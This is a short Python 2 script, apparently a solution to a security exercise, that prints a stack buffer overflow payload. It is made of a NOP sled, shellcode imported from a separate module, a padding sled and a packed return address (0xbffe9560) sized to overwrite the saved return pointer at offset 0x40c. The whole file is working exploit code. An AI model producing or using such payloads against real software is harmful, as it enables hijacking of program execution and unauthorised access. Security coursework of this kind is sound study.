from shellcode import shellcode
from struct import pack

addr = 0xbffe9560;

print '\x90'*(0x40c - len(shellcode) - 0x100) + shellcode + '\x90'*(0x100) + pack('<I', addr)	
